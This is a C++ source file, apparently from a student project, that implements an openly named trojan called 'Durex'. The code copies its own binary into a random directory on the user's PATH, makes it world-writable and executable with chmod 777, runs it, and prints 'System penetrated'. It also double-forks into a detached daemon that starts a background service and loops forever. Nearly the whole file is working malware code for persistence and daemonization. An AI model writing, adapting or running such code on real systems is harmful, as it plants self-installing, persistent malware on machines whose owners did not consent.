#include "Durex.hpp"

Durex::Durex ( char **env)
{
	srand(time(NULL));
	this->env = new Environment(env);
}

Durex::Durex ( Durex const & src )
{
	*this = src;
	return ;
}

Durex &				Durex::operator=( Durex const & rhs )
{
	return (*this);
}

Durex::~Durex ()
{
	if (this->env) {
		delete this->env;
	}
}

std::ostream &				operator<<(std::ostream & o, Durex const & i)
{
	return (o);
}

int Durex::getRandom(int low, int high)
{
   return rand() % (high - low + 1) + low;
}

std::string Durex::getDurexContent()
{
	std::fstream file;
	file.open("./Durex", std::fstream::in | std::ios::binary);
	if (file.is_open()) {
		std::string fileStr;
		std::istreambuf_iterator<char> inputIt(file), emptyInputIt;
		std::back_insert_iterator<std::string> stringInsert(fileStr);

		copy(inputIt, emptyInputIt, stringInsert);
		return fileStr;
	}
	return ("");
}

void Durex::executeInfected(std::string path)
{
	std::string permissions = "chmod 777 " + path;
	system(permissions.c_str());
	system(path.c_str());
}

void Durex::infectSystem()
{
	Variable	*var				= this->env->getVariable("PATH");
	int			random				= 0;
	if (var != NULL && var->getVarValue().length() > 0) {
		std::vector<std::string> content = Utils::split(var->getVarValue(), ':');
		if (content.size() > 0) {
			random = this->getRandom(0, (content.size() - 1));
			std::fstream file;
			std::string filename = content[random] + "/Durex";
			file.open(filename.c_str(), std::fstream::in | std::fstream::out | std::fstream::app);
			if (file.is_open()) {
				file << this->getDurexContent();
				file.close();

				this->executeInfected(filename);
				std::cout << "System penetrated in " << filename << " (using a durex) - frmarinh/jguyet " << std::endl;
			}
		}
	}
}

void Durex::startTrojan()
{
	pid_t	pid = fork();
	if (pid == 0) {
		int sid = setsid();
		if (sid > 0) {
			pid_t new_pid = fork();
			if (new_pid == 0) {
				Service service(this->getCurrentPath());
				service.initService();
				std::cout << "slt vasi tinfect le system stp (" << this->getCurrentPath() << ")" << std::endl;
				while (true);
			} else if (new_pid > 0) {
				exit(0);
			}
		} else {
			//throw DaemonCantDetachProcess();
		}
	} else if (pid < 0) {
		//throw DaemonForkFailed();
	} else {
		exit (0);
	}
}

std::string Durex::getCurrentPath()
{
    char arg1[20];
    char exe_path[PATH_MAX + 1] = { 0 };

    sprintf(arg1, "/proc/%d/exe", getpid());
    readlink(arg1, exe_path, 1024);
    return std::string(exe_path);
}

bool Durex::isInSystemBinaryPath()
{
	Variable	*var				= this->env->getVariable("PATH");
	std::string	executablePath		= this->getCurrentPath();
	if (var != NULL && var->getVarValue().length() > 0
		&& executablePath.length() > 0) {
		std::vector<std::string> content = Utils::split(var->getVarValue(), ':');
		for (int i = 0; i < content.size(); i++)
		{
			if (strstr(executablePath.c_str(), content[i].c_str())) {
				return true;
			}
		}
	}
	return false;
}
